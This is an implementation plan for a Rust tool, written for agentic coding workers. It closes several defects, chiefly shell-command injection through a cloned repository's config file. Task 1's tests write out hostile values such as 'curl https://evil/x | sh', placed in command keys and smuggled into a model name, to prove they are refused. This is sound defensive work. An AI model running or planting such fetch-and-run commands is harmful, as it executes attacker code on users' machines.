# Critical Defects Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the six items in `docs/bench/next-version-gaps.md` that are defects rather than measurements — a cloned repository that runs shell commands on the reader's machine, a generator failure graded as a completed run, a rebuild that hides its own next step, a `serve` that cannot bind under a deep path, a progress bar that misses its own cadence, and an instrument that cannot see an answer getting thinner — without moving a single recorded floor.

**Architecture:** Every change is inside one Rust crate and additive to the store's format. Task 1 narrows what a project's `repograph.toml` is allowed to say and validates what it does say before it reaches `sh -c`. Task 2 makes `enrich` count an empty answer as a failure and exit non-zero when it wrote nothing. Task 3 makes a writer name the nodes it left without questions. Task 4 gives `serve` a socket path that fits in `SUN_LEN` and removes it on `SIGTERM`. Task 5 budgets the embed checkpoint by tokens instead of rows. Task 6 adds an anchor-completeness column and a `--repeat` median to `bench`, measurement only. Tasks are independent; the order is by severity.

**Tech Stack:** Rust 2021 pinned by `rust-toolchain.toml` (1.98.0), dependencies `=`-pinned in `Cargo.toml`, no new crates except `libc` for Task 4's signal handler — and Task 4 states the alternative if a new dependency is refused. Tests are `#[cfg(test)]` modules beside the code, in the style already in `src/config.rs`, `src/enrich.rs` and `src/changes.rs`.

**Spec:** `docs/bench/next-version-gaps.md` on `origin/main` (`1e185ed`) — gaps G36, G16, G32, G27, G19, G15 and G23. Each task quotes the gap's own Gate as its acceptance criterion. The one thing this plan adds to the ledger is **G36's second door**, argued in Task 1 and written into the gaps file by that task.

## Global Constraints

- **`main` is behind.** The working clone's `main` is `fec9496`; `origin/main` is `1e185ed` and carries PR #21 (families derived) and PR #22 (the quotepath fix). Task 0 fast-forwards before anything is cut. Every line number below is read on `1e185ed`.
- **The fixture `~/bench/beauty-crm-502e8a6d` is read-only.** Commands against it are `--stale --no-dense`, or `bench`/`dump`/`verify`/`explain`. Never `build`/`update`/`enrich`/`embed` in place; a task that needs a writer copies the store first (`cp -R`), and the copy's `embed_model` must read `intfloat/multilingual-e5-small` before any `enrich`/`embed` runs on it.
- **No floor moves.** Every task ends by proving the four recorded arms are unchanged, either by argument (the change reaches no path `bench` reads) or by running them. A task that cannot argue it runs them.
- **ADR-001 applies:** a floor is committed before its number is read. Task 6 records baselines and sets no floor.
- Comments say why, never what. No ticket ids in code. Conventional Commits subjects (`fix(config):`, `fix(enrich):`, `perf(embed):`, `test(bench):`). The commit hook rejects AI attribution trailers and session links, and rejects any single shell command containing both a heredoc and `git commit` unless the heredoc's first line is the subject — so edits and commits go in separate commands.
- Any `gh` call runs `gh auth switch --user devmaxxx && gh …` in the same shell command.
- Every task ends with `cargo test` green and `cargo clippy --all-targets -- -D warnings` clean.

---

### Task 0: Sync and branch

**Files:**
- Modify: none

- [ ] **Step 1: Fast-forward `main` and record the tip**

```bash
git -C /Users/max/Documents/projects/repograph fetch origin && git -C /Users/max/Documents/projects/repograph checkout main && git -C /Users/max/Documents/projects/repograph merge --ff-only origin/main && git rev-parse --short HEAD
```

Expected: `1e185ed` or later. If the merge is not a fast-forward, stop and report — a local commit on `main` is not this plan's to rebase.

- [ ] **Step 2: Cut the branch**

```bash
git -C /Users/max/Documents/projects/repograph checkout -b fix/critical-defects
```

- [ ] **Step 3: Prove the tree is green before any edit**

```bash
cargo test --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml
```

Expected: PASS. A red baseline is reported, not worked around.

---

### Task 1: A cloned repository cannot run a command on the reader's machine (G36, both doors)

**Files:**
- Modify: `src/config.rs` (the `Config` doc comments, `Project` deserialization, `Config::load`'s template resolution)
- Modify: `README.md` (the Configure section's key table)
- Modify: `docs/bench/next-version-gaps.md` (G36 gains its second door and its status line)
- Test: `src/config.rs`'s own `mod tests`

**Interfaces:**
- Produces: `fn model_token_is_safe(v: &str) -> bool` — true when `v` matches `^[A-Za-z0-9][A-Za-z0-9._:/@+-]*$` and is at most 128 bytes. Used by `Config::load` for both `enrich_model` and `rerank_model`, whatever layer they came from.
- Produces: the rule that `enrich_command` and `rerank_command` in a **project** `repograph.toml` are refused with a line on stderr and the machine's (or built-in's) value used instead — the shape `embed_model` already has in the machine file, inverted.

**Why this is first, and why it is bigger than the gap says.** G36 records one door: `enrich_command`/`rerank_command` are read from the project file, the project's key wins, and the command runs under `sh -c` on the first `enrich` or `ask --rerank` after a clone. Reading `src/config.rs:150-185` on `1e185ed` shows a second door nobody has written down. The built-in template is

```
MAX_THINKING_TOKENS=0 claude -p --model {model} --output-format text --tools "" --setting-sources "" --no-session-persistence
```

and `{model}` is **unquoted**. `Config::load` ends with `cfg.enrich_command = enrich_template.replace(MODEL_SLOT, &cfg.enrich_model)`, and `enrich_model` is a key the project file may set. So a cloned repository whose `repograph.toml` says `enrich_model = "haiku; curl https://x/y | sh"` executes that on the first `enrich` **even after the command keys are refused**. Closing one door and leaving the other open is not a fix, so this task closes both: the command keys become machine-only, and the model token is validated wherever it comes from.

- [ ] **Step 1: Write the failing tests**

Add to `src/config.rs`'s `mod tests`, in the file's own style (every test that loads a config runs inside `with_machine`):

```rust
    /// A cloned repository is untrusted input. The transport is the reader's machine's business;
    /// the project file naming one is refused out loud rather than ignored, because a command that
    /// silently does not run is as hard to explain as one that silently does.
    #[test]
    fn a_project_file_cannot_name_the_command_that_runs_a_model() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(
                dir.path().join("repograph.toml"),
                "enrich_command = \"curl https://evil/x | sh\"\nrerank_command = \"curl https://evil/y | sh\"\n",
            )
            .unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
            assert!(!cfg.rerank_command.contains("evil"), "{}", cfg.rerank_command);
            assert!(cfg.enrich_command.starts_with("MAX_THINKING_TOKENS=0 claude -p --model haiku"));
        });
    }

    /// The machine file is the reader's own, so it keeps the key it always had.
    #[test]
    fn the_machine_file_still_names_the_command() {
        with_machine(Some("enrich_command = \"my-wrapper --model {model}\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_command, "my-wrapper --model haiku");
        });
    }

    /// The model name is interpolated into a shell string, so it is a token and not a sentence.
    #[test]
    fn a_model_name_that_could_end_the_command_is_refused() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"haiku; curl https://evil/x | sh\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, "haiku", "the built-in stands when the file's token is not one");
            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
        });
    }

    #[test]
    fn a_model_name_that_is_a_token_passes_whatever_its_vendor() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"qwen2.5-coder:7b\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, "qwen2.5-coder:7b");
            assert!(cfg.enrich_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.enrich_command);
        });
    }
```

If `with_machine` does not already take an `Option<&str>` body for the machine file, extend it in this step and keep every existing caller compiling by passing `None`.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cargo test --manifest-path Cargo.toml config::tests -- --nocapture`
Expected: FAIL — `a_project_file_cannot_name_the_command_that_runs_a_model` finds `evil` in the command; `a_model_name_that_could_end_the_command_is_refused` finds `evil` too.

- [ ] **Step 3: Refuse the two command keys in the project layer**

In `Config::load`, the project's named keys are already collected into `named`. Change the template resolution so `named` cannot win these two, and say so once per key:

```rust
        // A cloned repository is untrusted input and these two keys are a shell command. The
        // machine file is the reader's own and keeps them; the project file gets a refusal rather
        // than silence, so a repository that expects its own transport learns why it did not run.
        for key in ["enrich_command", "rerank_command"] {
            if named.contains_key(key) {
                let _ = writeln!(std::io::stderr(), "repograph.toml: {key} is not read from a repository — set it in the machine file ({}) if this is a transport you chose", machine_path().map(|p| p.display().to_string()).unwrap_or_else(|| "~/.config/repograph/config.toml".into()));
            }
        }
        let template = |key: &str, from_machine: Option<String>, builtin: &str| -> String {
            let _ = key;
            from_machine.unwrap_or_else(|| builtin.to_string())
        };
```

Keep the `key` parameter so the two call sites below read unchanged; the closure no longer consults `named`.

- [ ] **Step 4: Validate the model token wherever it comes from**

Add beside `Config::load`:

```rust
/// The model name is substituted into a shell command, so it is a token: a vendor's name, a tag, a
/// path. Anything that could end the command or start another one is refused and the built-in name
/// stands, because a wrong model answers badly and an injected one runs.
fn model_token_is_safe(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 128
        && v.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && v.chars().all(|c| c.is_ascii_alphanumeric() || "._:/@+-".contains(c))
}
```

and apply it in `Config::load` after the layering and the two `REPOGRAPH_*_MODEL` environment reads, immediately before the two `replace(MODEL_SLOT, …)` lines:

```rust
        for (name, slot, builtin) in [("enrich_model", &mut cfg.enrich_model, ENRICH_MODEL), ("rerank_model", &mut cfg.rerank_model, RERANK_MODEL)] {
            if !model_token_is_safe(slot) {
                let _ = writeln!(std::io::stderr(), "repograph: {name} = {slot:?} is not a model name — using {builtin}");
                *slot = builtin.to_string();
            }
        }
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `cargo test --manifest-path Cargo.toml config::tests`
Expected: PASS, all four new tests and every existing one.

- [ ] **Step 6: Say it in the README and in the ledger**

In `README.md`'s Configure section, mark `enrich_command` and `rerank_command` as machine-file-only in the key table and add one sentence under it: a repository you cloned can set which model runs, and cannot set what runs it. In `docs/bench/next-version-gaps.md`, append to G36 a paragraph naming the second door (the unquoted `{model}` slot, `src/config.rs`'s last two lines of `load`) and a **Closed (2026-09-09)** line naming both halves. Use the Write tool for this file, never a heredoc.

- [ ] **Step 7: Argue the floors**

No path `bench` reads passes through `enrich_command`, `rerank_command` or the model tokens unless `--rerank` is passed, which the recorded arms do not pass. State that in the commit body; do not run the arms.

- [ ] **Step 8: Commit**

```bash
git add src/config.rs README.md docs/bench/next-version-gaps.md && git commit -m "fix(config): a cloned repository names the model, never the command that runs it"
```

---

### Task 2: A generator that answered nothing is a failure (G16)

**Files:**
- Modify: `src/enrich.rs` (`run_command`, the batch loop's skipped-answer branch, `Report`)
- Modify: `src/main.rs:482-492` (the `Enrich` arm's exit)
- Test: `src/enrich.rs`'s own `mod tests`

**Interfaces:**
- Consumes: nothing from Task 1.
- Produces: `Report { generated, dropped, batches, failed, left }` unchanged in shape; `failed` now counts a batch whose retry also came back with nothing for every node. `Cmd::Enrich` returns `Err` when `r.left > 0` and the run was asked to write nodes.

- [ ] **Step 1: Write the failing tests**

Add to `src/enrich.rs`'s `mod tests`:

```rust
    /// `sh -c` returns its pipeline's last stage, so a generator that dies into a `tee` exits 0 with
    /// nothing on stdout. That is what happened on 167 batches once, and it was read as coverage.
    #[test]
    fn a_pipeline_whose_generator_died_is_a_failed_batch() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::new(dir.path());
        let g = graph();
        let r = run(&store, &g, Questions::default(), "false | cat", 8, 1, Scope::default()).unwrap();
        assert_eq!(r.generated, 0);
        assert!(r.failed > 0, "a pipeline that produced nothing is not coverage: {r:?}");
        assert!(r.left > 0);
    }

    #[test]
    fn an_empty_answer_is_a_failed_batch_after_its_retry() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::new(dir.path());
        let g = graph();
        let r = run(&store, &g, Questions::default(), "cat > /dev/null", 8, 1, Scope::default()).unwrap();
        assert_eq!((r.generated, r.batches), (0, 1));
        assert_eq!(r.failed, 1, "one batch, asked twice, answered nothing twice");
    }
```

and extend the existing `nodes_a_model_answer_skipped_are_asked_once_more` with one line, keeping its retry assertion exactly as it is:

```rust
        assert_eq!(r.failed, 1, "a batch that skipped every node twice is failed, not done");
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cargo test --manifest-path Cargo.toml enrich::tests`
Expected: FAIL — `r.failed` reads 0 in all three.

- [ ] **Step 3: Make the pipeline's failure reach `run_command`**

In `src/enrich.rs`, probe once for a shell that propagates a pipeline's status and use it when it is there. POSIX `sh` has no `pipefail`; macOS's is bash and does, Debian's `dash` does not, so this is a capability and not an assumption:

```rust
/// `sh -c 'a | b'` returns b's status, so a generator that dies into a `tee` looks like success.
/// Shells that have `pipefail` are asked for it; those that do not fall back to the empty-answer
/// check below, which is the load-bearing half — a pipeline's status is the operator's to get
/// right, an empty answer is nobody's to mistake for one.
fn pipefail_prefix() -> &'static str {
    static P: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    let ok = *P.get_or_init(|| {
        shell()
            .and_then(|mut c| Ok(c.arg("-c").arg("set -o pipefail").stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).status()?))
            .map(|s| s.success())
            .unwrap_or(false)
    });
    if ok { "set -o pipefail; " } else { "" }
}
```

and in `run_command`, build the argument as `format!("{}{command}", pipefail_prefix())`.

- [ ] **Step 4: Count an empty answer as a failure once its retry is spent**

In the batch loop, the `skipped` branch currently re-queues once and then lets the batch fall through as done. Change the second visit so a batch that produced nothing for every node increments `failed`:

```rust
                        let skipped: Vec<(&Node, String)> = b.iter().filter(|(n, _)| !parsed.contains_key(&n.id)).cloned().collect();
                        if !skipped.is_empty() && !retry {
                            eprintln!("enrich: {} of {} nodes skipped by the model, retrying them", skipped.len(), b.len());
                            queue.push(Batch { nodes: skipped, retry: true, code: is_code });
                        } else if skipped.len() == b.len() {
                            // Asked twice, answered for nobody: the generator is not declining these
                            // nodes, it is not answering. Counting it as coverage is what let a whole
                            // run report `0 failed`.
                            *failed.lock().unwrap() += 1;
                        }
```

Match the surrounding code's actual sharing type for `failed` (it is threaded through the same `shared` tuple the loop already unwraps at `src/enrich.rs:363`); do not introduce a second mutex if one is already there.

- [ ] **Step 5: Make the exit status say it**

In `src/main.rs`, the `Cmd::Enrich` arm prints its line and then returns `embed_all(...)`. Keep the print, then refuse:

```rust
            println!("enrich: {} nodes written, {} dropped, {} still without questions, {} batches ({} failed) in {:.0}s", r.generated, r.dropped, r.left, r.batches, r.failed, t.elapsed().as_secs_f32());
            // A run that was asked to write and wrote nothing exits like a run that wrote
            // everything, and a campaign then grades a store nobody enriched.
            if r.failed > 0 && r.generated == 0 {
                anyhow::bail!("enrich: {} of {} batches produced nothing — the generator did not answer", r.failed, r.batches);
            }
            embed_all(&repo, cli.no_dense, &cfg)
```

The condition is `failed > 0 && generated == 0` rather than `left > 0`: a store legitimately keeps nodes the model declines (63 of them on the bench corpus, `src/enrich.rs:44`), so `left > 0` alone is normal and would make every honest run red.

- [ ] **Step 6: Run the tests to verify they pass**

Run: `cargo test --manifest-path Cargo.toml enrich::tests`
Expected: PASS.

- [ ] **Step 7: Prove the exit status by hand**

```bash
cd $(mktemp -d) && git init -q . && mkdir -p docs && printf '### FR-X-1 · t\n\nbody\n' > docs/a.md && /Users/max/Documents/projects/repograph/target/debug/repograph build --no-dense >/dev/null 2>&1; REPOGRAPH_CONFIG=/dev/null /Users/max/Documents/projects/repograph/target/debug/repograph enrich --no-dense --batch 8 --parallel 1; echo "exit=$?"
```

Expected: `exit=1` with the bail line, after `cargo build` has produced the binary. (The default command is `claude -p`; if `claude` is on PATH and answers, set a stub first with `REPOGRAPH_CONFIG` pointing at a machine file whose `enrich_command = "false | cat"`.)

- [ ] **Step 8: Update the ledger and commit**

Append a **Closed (2026-09-09)** line to G16 naming the three places and the one that was left alone (`left > 0` is not by itself an error, and why). Write the file with the Write tool.

```bash
git add src/enrich.rs src/main.rs docs/bench/next-version-gaps.md && git commit -m "fix(enrich): a generator that answered nothing is a failure, not coverage"
```

---

### Task 3: A rebuild names the nodes it left without questions (G32)

**Files:**
- Modify: `src/main.rs` (the `Build` and `Update` arms, after the graph is written)
- Modify: `README.md` (Embeddings section)
- Test: `src/enrich.rs`'s `mod tests` for the counting function; the arms are one call each

**Interfaces:**
- Consumes: `enrich::coverage(&graph, &questions) -> (usize, usize)` — already exists and is already the pair `bench` prints as `(covered/eligible)`.
- Produces: nothing new; both arms call `coverage` and print one line when the store carries any questions at all.

- [ ] **Step 1: Write the failing test**

```rust
    /// A store with no questions is a store nobody enriched, and saying so on every build would be
    /// noise. A store that has some and is missing others is a rebuild that moved the corpus, and
    /// that is the line worth printing.
    #[test]
    fn the_line_is_printed_only_when_the_store_has_questions_and_is_missing_some() {
        let mut e = Extraction::default();
        e.node(NodeKind::Requirement, "FR-X-1", "t", "body", "d.md", 1);
        e.node(NodeKind::Requirement, "FR-X-2", "t2", "body2", "d.md", 5);
        let mut g = Graph::default();
        g.apply(e);
        let mut q = Questions::default();
        assert_eq!(unenriched_note(&g, &q), None, "a store nobody enriched says nothing");
        q.set("FR-X-1", vec!["q".to_string()]);
        assert_eq!(unenriched_note(&g, &q), Some(1));
        q.set("FR-X-2", vec!["q".to_string()]);
        assert_eq!(unenriched_note(&g, &q), None, "a complete store says nothing either");
    }
```

Use the `Questions` mutator the crate already has; if the only writer is `run`, add the test's two entries by calling `run` with the `awk` stub the module already uses, as `code_questions_are_generated_only_when_asked_for_and_kept_either_way` does.

- [ ] **Step 2: Run it to verify it fails**

Run: `cargo test --manifest-path Cargo.toml enrich::tests::the_line_is_printed`
Expected: FAIL — `unenriched_note` is not defined.

- [ ] **Step 3: Implement**

In `src/enrich.rs`:

```rust
/// How many eligible nodes have no questions, when the store has questions for some. `None` when
/// there is nothing to say: an unenriched store is a state, a partly enriched one is a next step.
pub fn unenriched_note(graph: &Graph, questions: &Questions) -> Option<usize> {
    let (covered, eligible) = coverage(graph, questions);
    (covered > 0 && eligible > covered).then_some(eligible - covered)
}
```

In `src/main.rs`, in both the `Build` and `Update` arms after the graph is saved and before `embed_all`:

```rust
            if let Some(n) = enrich::unenriched_note(&graph, &enrich::Questions::load(&store)?) {
                eprintln!("repograph: {n} requirement-like nodes have no questions — run `repograph enrich` to search them");
            }
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `cargo test --manifest-path Cargo.toml enrich::tests`
Expected: PASS.

- [ ] **Step 5: Say it in the README**

One sentence in the Embeddings section: a rebuild under a corpus that grew adds nodes `enrich` has never seen, and the writer prints how many; the fix is `repograph enrich`.

- [ ] **Step 6: Commit**

```bash
git add src/enrich.rs src/main.rs README.md && git commit -m "fix(enrich): a rebuild says how many nodes it left without questions"
```

---

### Task 4: `serve` binds under a deep path and leaves no socket behind (G27)

**Files:**
- Modify: `src/serve.rs:107` (`socket_path`) and the bind path around `src/serve.rs:201-207`
- Modify: `README.md` (the `serve` section)
- Test: `src/serve.rs`'s own `mod tests`

**Interfaces:**
- Produces: `pub fn socket_path(repo: &Path) -> PathBuf` — unchanged signature. Returns `<repo>/.repograph/serve.sock` when that path is at most 100 bytes, else `<tmp>/repograph-<16 hex of the canonical repo path>.sock`. Both the server and the client call it, so they cannot disagree.

**Why 100 and not 104.** `sockaddr_un.sun_path` is 104 bytes on macOS **including** the terminating NUL; 108 on Linux. 100 leaves the margin and is one number on every platform, which is worth more here than four bytes.

- [ ] **Step 1: Write the failing tests**

```rust
    #[test]
    fn a_deep_repository_gets_a_socket_that_fits() {
        let deep = std::path::PathBuf::from("/private/tmp").join("a".repeat(120));
        let p = socket_path(&deep);
        assert!(p.as_os_str().len() <= 100, "{}", p.display());
        assert!(p.file_name().unwrap().to_string_lossy().starts_with("repograph-"));
        // The same repository always gets the same name, or the client cannot find the server.
        assert_eq!(socket_path(&deep), p);
        // A different repository gets a different one.
        assert_ne!(socket_path(&deep.join("x")), p);
    }

    #[test]
    fn a_shallow_repository_keeps_the_socket_it_has_always_had() {
        let p = socket_path(std::path::Path::new("/tmp/r"));
        assert!(p.ends_with(".repograph/serve.sock"), "{}", p.display());
    }
```

- [ ] **Step 2: Run them to verify they fail**

Run: `cargo test --manifest-path Cargo.toml serve::tests`
Expected: FAIL — the deep path's socket is 140-odd bytes.

- [ ] **Step 3: Implement the fallback**

```rust
/// `<repo>/.repograph/serve.sock`, which is where a person looks for it — unless the name will not
/// fit in `sun_path` (104 bytes on macOS, including the NUL), in which case a name derived from the
/// canonical repository path goes in the temporary directory. Server and client both come here, so
/// the fallback is never half-taken.
pub fn socket_path(repo: &Path) -> PathBuf {
    let in_repo = repo.join(".repograph").join("serve.sock");
    if in_repo.as_os_str().len() <= 100 { return in_repo; }
    let canonical = std::fs::canonicalize(repo).unwrap_or_else(|_| repo.to_path_buf());
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in canonical.as_os_str().as_encoded_bytes() {
        h ^= u64::from(*b);
        h = h.wrapping_mul(0x1000_0000_01b3);
    }
    std::env::temp_dir().join(format!("repograph-{h:016x}.sock"))
}
```

FNV-1a inline rather than a new crate: the hash names a file, it does not defend anything.

- [ ] **Step 4: Remove the socket on `SIGTERM`**

`Drop` does not run on a signal. Install a handler in `serve`'s startup, immediately after a successful bind, using `libc` (already an indirect dependency; add it as a direct `=`-pinned one if `cargo tree -i libc` shows it is not resolvable). The handler must be async-signal-safe, so it holds the path as bytes in a static and calls `unlink` directly:

```rust
/// The path this process bound, as a C string, for the signal handler to unlink. A handler may call
/// almost nothing; `unlink` is on the short list, `PathBuf` and `format!` are not.
static BOUND: std::sync::OnceLock<std::ffi::CString> = std::sync::OnceLock::new();

#[cfg(unix)]
extern "C" fn on_term(sig: libc::c_int) {
    if let Some(p) = BOUND.get() { unsafe { libc::unlink(p.as_ptr()) }; }
    unsafe { libc::_exit(128 + sig) }
}
```

registered with `libc::signal(libc::SIGTERM, on_term as libc::sighandler_t)` and the same for `SIGINT`, both `#[cfg(unix)]`. On Windows the `Drop` path stands and the README says so.

If a new direct dependency is refused, the alternative is one line in the README — «a `SIGTERM`ed `serve` leaves its socket file; the next `serve` removes it before binding» — which G27 itself names as an acceptable close. Take the handler; take the sentence only if the dependency is refused.

- [ ] **Step 5: Run the tests and prove it by hand**

Run: `cargo test --manifest-path Cargo.toml serve::tests`
Expected: PASS.

```bash
D=$(mktemp -d)/$(python3 -c "print('d/'*40)") && mkdir -p "$D" && cp -R ~/bench/beauty-crm-502e8a6d/.repograph "$D/" && cd "$D" && /Users/max/Documents/projects/repograph/target/debug/repograph serve --idle 30 & sleep 3; /Users/max/Documents/projects/repograph/target/debug/repograph --repo "$D" --no-dense ask --stale отмена записи | head -3
```

Expected: the answer arrives; before this task it fails with a bind error naming `sun_path`.

```bash
pkill -TERM -f "repograph serve" ; sleep 1; ls "$TMPDIR"/repograph-*.sock 2>/dev/null; echo "leftover=$?"
```

Expected: `leftover=1` (no such file).

- [ ] **Step 6: README and ledger, then commit**

The `serve` section gains two sentences: where the socket lives, and the fallback for a deep path. Append a **Closed (2026-09-09)** line to G27.

```bash
git add src/serve.rs README.md docs/bench/next-version-gaps.md Cargo.toml Cargo.lock && git commit -m "fix(serve): a socket that fits under a deep path, and none left behind"
```

---

### Task 5: The progress line is budgeted by tokens, not by rows (G19)

**Files:**
- Modify: `src/main.rs:414` (`SYNC_CHUNK`), `src/main.rs:425` (the `sync_chunked` call)
- Modify: `src/index/dense.rs` (`sync_chunked`'s chunking, to take a token budget)
- Test: `src/index/dense.rs`'s own `mod tests`

**Interfaces:**
- Consumes: `crate::index::embed::token_batches` (`src/index/embed.rs:297`) — the budgeting `embed` already does per forward.
- Produces: `DenseIndex::sync_chunked(&mut self, graph, questions, embed, budget: ChunkBudget, on_progress)` where `ChunkBudget { tokens: usize, max_rows: usize }`. `max_rows` stays as the upper bound so a corpus of one-word passages still checkpoints.

**The arithmetic this task must respect.** G19 records that the first line landed at 102.4 s, of which about 56 s is fixed startup (2.24 GB of weights paged in) before any row can be checkpointed — so a smaller chunk alone cannot meet the 60 s bar. This task therefore does two things: budgets the chunk by tokens, **and** prints one line when the embedder is open and before the first forward, so the first interval is the open and not the open plus a chunk.

- [ ] **Step 1: Write the failing test**

```rust
    /// A chunk is a unit of work, and a row is not one: 1,024 short rows and 1,024 long passages
    /// are the same count and a minute apart. The budget is the same one a forward uses.
    #[test]
    fn a_chunk_is_bounded_by_tokens_and_by_rows() {
        let short: Vec<String> = (0..4096).map(|i| format!("row {i}")).collect();
        let long: Vec<String> = (0..4096).map(|i| format!("{} {i}", "слово ".repeat(400))).collect();
        let b = ChunkBudget { tokens: 60_000, max_rows: 1024 };
        assert_eq!(chunk_ends(&short, b).first().copied(), Some(1024), "short rows hit the row cap");
        let first_long = chunk_ends(&long, b).first().copied().unwrap();
        assert!(first_long < 200, "a chunk of long passages ends early: {first_long}");
    }
```

- [ ] **Step 2: Run it to verify it fails**

Run: `cargo test --manifest-path Cargo.toml dense::tests::a_chunk_is_bounded`
Expected: FAIL — `ChunkBudget` and `chunk_ends` are not defined.

- [ ] **Step 3: Implement `chunk_ends` and thread the budget through**

```rust
/// Where each checkpoint falls: whichever comes first, the token budget or the row cap. The token
/// count is the same cheap estimate `token_batches` uses, because a checkpoint should measure what
/// a forward measures or the bar it is judged against is measuring something else.
pub fn chunk_ends(texts: &[String], b: ChunkBudget) -> Vec<usize> {
    let mut ends = Vec::new();
    let (mut tokens, mut rows) = (0usize, 0usize);
    for (i, t) in texts.iter().enumerate() {
        tokens += crate::index::embed::token_estimate(t);
        rows += 1;
        // One row that is over budget on its own still gets a chunk; the alternative is a chunk
        // that never ends.
        if tokens >= b.tokens || rows >= b.max_rows {
            ends.push(i + 1);
            tokens = 0;
            rows = 0;
        }
    }
    if ends.last() != Some(&texts.len()) && !texts.is_empty() { ends.push(texts.len()); }
    ends
}
```

`token_estimate` is whatever `token_batches` (`src/index/embed.rs:297`) already uses to count a text against `TOKEN_BUDGET`; if it is inlined there, extract it as `pub(crate) fn token_estimate(&str) -> usize` in this step and have `token_batches` call it, so the two counts cannot drift.

Set the default in `src/main.rs`: `const SYNC_CHUNK: ChunkBudget = ChunkBudget { tokens: 60_000, max_rows: 1024 };` with a comment recording why the number is what it is — 60,000 tokens is the measured throughput of about 40 s of forwards on the small model at the resource run's rate, chosen so a chunk is comfortably under the 60 s bar and not so small that the checkpoint write dominates.

- [ ] **Step 4: Print a line when the model is open**

In `embed_all`, immediately after the embedder is opened and before the first chunk:

```rust
        eprintln!("dense: model open in {:.1}s, {} rows to embed", open.elapsed().as_secs_f32(), total);
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `cargo test --manifest-path Cargo.toml dense::tests`
Expected: PASS.

- [ ] **Step 6: Measure the cadence on a copy**

```bash
cp -R ~/bench/beauty-crm-502e8a6d /private/tmp/g19-copy && cd /private/tmp/g19-copy && rm -rf .repograph/dense && /usr/bin/time -l /Users/max/Documents/projects/repograph/target/release/repograph embed 2>&1 | ts -s "%.s" | tee /private/tmp/g19-cadence.txt | tail -5
```

If `ts` is not installed, pipe through `awk '{ "date +%s.%N" | getline t; close("date +%s.%N"); print t, $0 }'`. Then read the intervals:

```bash
awk '/^[0-9]/ { if (p) printf "%.1f\n", $1-p; p=$1 }' /private/tmp/g19-cadence.txt | sort -n | tail -3
```

Expected: every interval under 60.0, including the first. Record the run's wall, peak CPU and max RSS beside G19's own 1,930 s / 293% / 2.15 GB and state whether they moved.

- [ ] **Step 7: Commit**

```bash
git add src/main.rs src/index/dense.rs docs/bench/next-version-gaps.md && git commit -m "perf(embed): a checkpoint measures what a forward measures"
```

---

### Task 6: The instrument can see an answer getting thinner (G15), and its own repeatability (G23)

**Files:**
- Modify: `src/bench.rs` (`Summary`, the per-case loop at `src/bench.rs:320-350`, the summary line)
- Modify: `src/main.rs:124` (`Cmd::Bench` gains `--repeat`)
- Modify: `docs/bench/runbook.md` (the reader-suite precondition)
- Test: `src/bench.rs`'s own `mod tests`

**Interfaces:**
- Produces: `Summary { by_kind, p90_tokens, anchors: Vec<(String, (usize, usize))> }` — reached over wanted per kind, summed from the `(reached, want)` pair the per-case line at `src/bench.rs:336` already computes and throws away.
- Produces: `bench --repeat N` — runs the suite N times, prints each run's summary line, then a median line. Default 1, so every recorded invocation reads exactly as it does today.

**This task sets no floor.** `passes()` is untouched; the anchor totals are printed and recorded as a baseline. G15's own Gate says so, and ADR-001 is why.

- [ ] **Step 1: Write the failing test**

```rust
    /// A case that keeps its verdict and loses two of its three anchors is the shape the whole
    /// summary was blind to: `multi` read HIT 3/3 before a change and HIT 1/3 after, and every
    /// count in the summary was identical.
    #[test]
    fn the_summary_carries_anchors_reached_over_wanted() {
        let mut s = Summary::default();
        s.record("multi", true, (3, 3));
        s.record("multi", true, (1, 3));
        s.record("keyword", false, (0, 1));
        assert_eq!(s.kind("multi"), (2, 2), "both cases are hits");
        assert_eq!(s.anchors("multi"), (4, 6), "and four of six anchors were reached");
        assert_eq!(s.anchors("keyword"), (0, 1));
    }
```

- [ ] **Step 2: Run it to verify it fails**

Run: `cargo test --manifest-path Cargo.toml bench::tests::the_summary_carries_anchors`
Expected: FAIL — `record` and `anchors` are not defined.

- [ ] **Step 3: Implement**

Add `anchors: Vec<(String, (usize, usize))>` to `Summary`, a `record(&mut self, kind, hit, (reached, want))` that updates both vectors in the kind order the case file introduces, and an `anchors(&self, kind) -> (usize, usize)` reader. In the per-case loop replace the two hand-rolled updates with one `summary.record(&case.kind, ok, (reached, want))`. Extend the summary line so each kind reads `multi 10/12 (28/34 anchors)`.

- [ ] **Step 4: Add `--repeat`**

In `src/main.rs`, `Bench` gains `#[arg(long, default_value_t = 1)] repeat: usize`. The arm runs the suite `repeat` times and, when `repeat > 1`, prints a final line carrying the median of each count and of `p90_tokens`. A `--repeat 1` invocation prints exactly what it prints today, byte for byte.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `cargo test --manifest-path Cargo.toml bench::tests`
